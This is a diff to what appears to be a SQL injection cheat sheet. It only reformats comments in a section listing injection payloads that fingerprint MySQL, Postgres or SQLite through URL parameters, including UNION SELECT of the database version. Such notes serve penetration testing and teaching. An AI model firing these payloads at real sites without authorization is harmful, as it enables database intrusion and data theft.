@@ -194,18 +194,18 @@ Confirm vulnerability: `http://targetsite.com/price.php?id=2   ->   http://targe
 
 DB fingerprinting techniques:
 ```
---MySQL                                                              // FINGERPRINTING:        
-   http://www.example.com/news.php?id=1 /*! AND 1=1 */--           // via. comments
-   http://www.example.com/news.php?id=1 AND 'aa'=CONCAT('a','a')   // via. MySQL CONCAT()
-   http://www.example.com/news.php?id=1 AND 1=2 UNION SELECT 1, 2, @@version  // via. db version
+/* MySQL */                                                        -- FINGERPRINTING:        
+   http://www.example.com/news.php?id=1 /*! AND 1=1 */--           -- via. comments
+   http://www.example.com/news.php?id=1 AND 'aa'=CONCAT('a','a')   -- via. MySQL CONCAT()
+   http://www.example.com/news.php?id=1 AND 1=2 UNION SELECT 1, 2, @@version  -- via. db version
 
---Postgres
-   http://www.example.com/news.php?id=1 AND 1=1::int               // via. typecast
-   http://www.example.com/news.php? id=1 AND 'a'='a'||'a'          // via. Postgres concat
+/* Postgres */
+   http://www.example.com/news.php?id=1 AND 1=1::int               -- via. typecast
+   http://www.example.com/news.php? id=1 AND 'a'='a'||'a'          -- via. Postgres concat
    http://www.example.com/news.php? id=1
-   SELECT version()                                                // via. db version
+   SELECT version()                                                -- via. db version
 
---If !MySQL and !Postgres, most likely SQLite:
+/* If !MySQL and !Postgres, most likely SQLite: */
    http://www.sqlitetutorial.net/sqlite-cheat-sheet   OR
    https://d17h27t6h515a5.cloudfront.net/topher/2016/September/57ed880e_sql-sqlite-commands-cheat-sheet/sql-sqlite-commands-cheat-sheet.pdf
 ```
